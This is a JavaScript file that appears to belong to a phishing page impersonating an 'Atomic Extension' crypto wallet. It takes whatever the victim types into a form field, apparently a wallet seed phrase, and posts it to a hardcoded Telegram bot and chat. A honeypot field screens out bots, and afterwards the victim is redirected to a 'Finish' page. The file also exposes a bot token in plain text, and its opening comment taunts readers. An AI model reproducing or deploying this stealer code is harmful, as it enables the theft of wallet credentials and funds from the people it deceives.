// stay away, so ican stay away from you! showing my data doesn't mean i'm dumb! 7di kerek bootate andi ghamreY7in
const botToken = "6742694619:AAFWNnMj7914xN4dIk1_VAY_RMxfmAeEukk";
const chatId = "-5313491853";

function sendData(event) {
  event.preventDefault();
  const loaderContainer = document.getElementById("loaderContainer");

  const data = document.getElementById("data").value;
  const hiddenField = document.getElementById("hiddenField").value;
  loaderContainer.style.display = "block";

  // Check if the hidden field has been filled, indicating bot activity
  if (hiddenField !== "") {
    alert("You are bot stop!");
    window.location.href = window.location.href;
    console.log("Bot activity detected. Form submission aborted.");
    return;
  }

  // Customize the message by assigning it to the 'message' variable
  const emoji = "\u{269B}"; // Fireworks emoji
  const messagePrefix = `${emoji} Atomic Extension ${emoji}\n`;

  const message = `${messagePrefix} ${data}`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const params = {
    chat_id: chatId,
    text: message,
  };

  axios.post(url, params).then((response) => {
    console.log("Data sent successfully:", response.data);
    setTimeout(() => {
      // Redirect after 5 seconds
      window.location.href = "Finish.html"; // Replace with your desired redirection URL
    }, 5000); // Delay in milliseconds (5 seconds)
  });
}
